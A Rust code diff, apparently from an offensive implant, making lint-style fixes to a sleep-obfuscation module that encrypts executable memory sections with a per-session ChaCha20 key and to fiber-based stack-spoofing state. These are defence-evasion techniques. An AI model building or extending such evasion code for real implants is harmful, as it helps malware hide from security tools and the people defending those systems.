@@ -1,5 +1,8 @@
+use common::config::SleepConfig;
+#[cfg(windows)]
 use anyhow::Result;
-use common::config::{SleepConfig, SleepMethod};
+#[cfg(windows)]
+use common::config::SleepMethod;
 use log::debug;
 #[cfg(windows)]
 use log::info;
@@ -89,14 +92,14 @@ pub mod crypto {
     use rand::RngCore;
 
     thread_local! {
-        static SESSION_KEY: std::cell::RefCell<[u8; 32]> = std::cell::RefCell::new([0; 32]);
-        /// Per-session random nonce for ChaCha20.  Generated alongside the key
-        /// in encrypt_sections() and consumed in decrypt_sections().  A fresh
-        /// nonce each cycle eliminates any keystream-reuse risk.
-        static SESSION_NONCE: std::cell::RefCell<[u8; 12]> = std::cell::RefCell::new([0; 12]);
-        /// Set to true after a successful encrypt_sections() so decrypt_sections()
-        /// can refuse to run with a zero key.
-        static SESSION_INITIALIZED: std::cell::Cell<bool> = std::cell::Cell::new(false);
+        static SESSION_KEY: std::cell::RefCell<[u8; 32]> = const { std::cell::RefCell::new([0; 32]) };
+        // Per-session random nonce for ChaCha20.  Generated alongside the key
+        // in encrypt_sections() and consumed in decrypt_sections().  A fresh
+        // nonce each cycle eliminates any keystream-reuse risk.
+        static SESSION_NONCE: std::cell::RefCell<[u8; 12]> = const { std::cell::RefCell::new([0; 12]) };
+        // Set to true after a successful encrypt_sections() so decrypt_sections()
+        // can refuse to run with a zero key.
+        static SESSION_INITIALIZED: std::cell::Cell<bool> = const { std::cell::Cell::new(false) };
     }
 
     #[cfg(windows)]
@@ -156,7 +159,7 @@ pub mod crypto {
             Err(_) => return Vec::new(),
         };
         let mut sections = Vec::new();
-        for line in BufReader::new(f).lines().flatten() {
+        for line in BufReader::new(f).lines().map_while(Result::ok) {
             // Format: <start>-<end> <perms> <offset> <dev> <inode> [pathname]
             if !line.contains("r-xp") && !line.contains("r--p") {
                 continue;
@@ -429,13 +432,13 @@ pub mod crypto {
 }
 
 pub mod spoof {
-    /// Thread-local state for fiber-based stack spoofing.
+    // Thread-local state for fiber-based stack spoofing.
     thread_local! {
         static MAIN_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
-            std::cell::Cell::new(std::ptr::null_mut());
+            const { std::cell::Cell::new(std::ptr::null_mut()) };
         static SLEEP_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
-            std::cell::Cell::new(std::ptr::null_mut());
-        static SLEEP_DURATION_NS: std::cell::Cell<u64> = std::cell::Cell::new(0);
+            const { std::cell::Cell::new(std::ptr::null_mut()) };
+        static SLEEP_DURATION_NS: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
     }
 
     #[cfg(windows)]
